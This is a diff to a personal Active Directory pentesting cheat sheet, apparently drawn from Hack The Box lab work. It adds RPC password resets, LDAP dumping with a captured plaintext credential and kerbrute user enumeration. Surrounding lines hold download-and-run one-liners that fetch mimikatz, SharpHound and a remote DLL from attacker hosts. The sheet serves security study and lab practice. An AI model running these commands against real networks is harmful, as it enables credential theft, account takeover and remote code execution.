@@ -22,6 +22,12 @@ rpcclient -U "" -N "IP" 		(Null session)
 - querydispinfo
 > Can also do password spraying through it
 
+> We can change user's password using RPC if we have permissions
+```
+setuserinfo2
+setuserinfo2 audit2020 23 password123!
+```
+
 ## ldapdomaindump:
 - Dumps domain info using LDAP
 ```bash
@@ -36,6 +42,8 @@ dig axfr @"IP ADDRESS" "DOMAIN NAME"
 - Information Leaking
 ```
 dig @"IP ADDRESS" "DOMAIN NAME"
+dig ns @"IP ADDRESS" "DOMAIN NAME"
+dig nx @"IP ADDRESS" "DOMAIN NAME"
 dig any @"IP ADDRESS" "DOMAIN NAME"
 dig all @"IP ADDRESS" "DOMAIN NAME"
 ```
@@ -55,7 +63,7 @@ dnsrecon -d "IP ADDRESS" -r "IP ADDRESS RANGE"
 ```
 
 ## IPC Share
-- If we have IPC share with read only anonymosu access we can dump information
+- If we have IPC share with read only anonymus access we can dump information
 ```bash
 lookupsid.py anonymous@"IP ADDRESS"
 ```
@@ -74,6 +82,8 @@ mget *
 ```
 - Look for access in shares using `smbmap`
 ```bash
+smbmap -H "IP ADDRESS" -u null
+
 smbmap -u "" -p "" -H "IP ADDRESS"
 
 smbmap -u anonymous -H "IP ADDRESS"
@@ -89,6 +99,12 @@ smbmap -u "" -p "" -R "SHARE NAME" -H "IP ADDRESS" -A "FILE NAME" -q
 - We can then locate it
 - If found files through SMB or FTP download them and use `exiftool` to see if they leak a username
 
+## Mount SMB Shares:
+- We can mount SMB shares using
+```bash
+mount -t cifs //10.10.10.192/profiles$ /mnt
+``` 
+
 ## smbpasswd:
 - If we get a `NT_STATUS_PASSWORD_MUST_CHANGE` error we can change the pass using `smbpasswd`
 ```bash
@@ -99,12 +115,13 @@ smbpasswd -r "IP ADDRESS" -U "USERNAME"
 - -x = Anonymous bind
 - -h = host
 ```bash
-ldapsearch -x -h "IP"
+ldapsearch -h "IP" -x
+ldapsearch -H ldap://10.129.134.37 -x
 ```
 - -s = scope (which is usually set to base)
 - namingcontext = finding  the domain name
 ```bash
-ldapsearch -x -h "IP" -s base namingcontext
+ldapsearch -h "IP" -x -s base namingcontext
 ```
 - -b = base
 ```bash
@@ -126,6 +143,10 @@ ldapsearch -x -h "IP" -b "USUALLT THE FIRST DN (e.g; -b "DC=htb,DC=local")" '(ob
 - To search for a string in the output like default passwords
 ```bash
 ldapsearch -h 192.168.80.7 -x -b "DC=pwn,DC=local" | grep -i "default"
+```
+- If some creds are found they can be used to further enumerate LDAP
+```bash
+ldapsearch -h 10.10.10.192 -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight' > support_ldap_dump
 ```
 
 ## Generating password list from a list of common passwords:
@@ -203,6 +224,12 @@ psexec.py "DOMAIN"/"USERNAME":"PASSWORD"@"IP ADDRESS"
 GetADUsers.py -all -dc-ip "IP ADDRESS" "DOMAIN"/"USERNAME"
 ```
 
+## Kerbrute:
+- We can check if the user exist on domain controller using
+```bash
+/opt/kerbrute/kerbrute userenum --dc 10.129.97.156 -d BLACKFIELD.local actual-users.txt
+```
+
 ## Kerberoasting Cheatsheet:
 https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
 - If we have a account username and password we can kerberoast using it
@@ -244,6 +271,19 @@ john --format=krb5asrep -w=~/Desktop/rockyou.txt hash.txt
 evil-winrm -u "USERNAME" -p "PASSWORD" -i "IP ADDRESS"
 ```
 
+## SeBackupPrivilege:
+- Check Blackfield notes
+
+## Things to check when we have password access in a domain:
+- winrm
+- smb
+- ldap
+- rpc
+- lookupsid
+- bloodhound
+- kerberoast
+- GetADUsers.py
+
 ## Privilege Escalation Methods:
 - Winpeas.exe (To find)
 - Unquoted Service Paths
@@ -265,11 +305,11 @@ New-PSDrive -Name "USERNAME" -PSProvider FileSystem -Credential $cred -Root \\"I
 cd "USERNAME": # Get into the drive
 ```
 - Cert Util
-```powershell
+```bash
 certutil -urlcache -f http://10.17.4.195/mimikatz-32.exe mimikatz.exe
 ```
 - Powershell
-```powershell
+```bash
 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.15.75/SharpHound.ps1')"
 
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.14.12.230/CLSID.ps1')|iex"
@@ -342,7 +382,7 @@ Seatbelt.exe -group=all -full
 ```
 - Powershell Method using remote DLL:
 ```cs
-[System.Reflection.Assembly]::Load((new-object net.webclient).DownloadData("https://example.com/SharpSploit.dll").GetType("SharpSploit.Execution.Shell").GetMethod("ShellExecute").Invoke(0, @("whoami", "", "", ""))
+[System.Reflection.Assembly]::Load(new-object net.webclient).DownloadData("https://example.com/SharpSploit.dll").GetType("SharpSploit.Execution.Shell").GetMethod("ShellExecute").Invoke(0, @("whoami", "", "", ""))
 ```
 - C# Method using remote DLL:
 ```cs
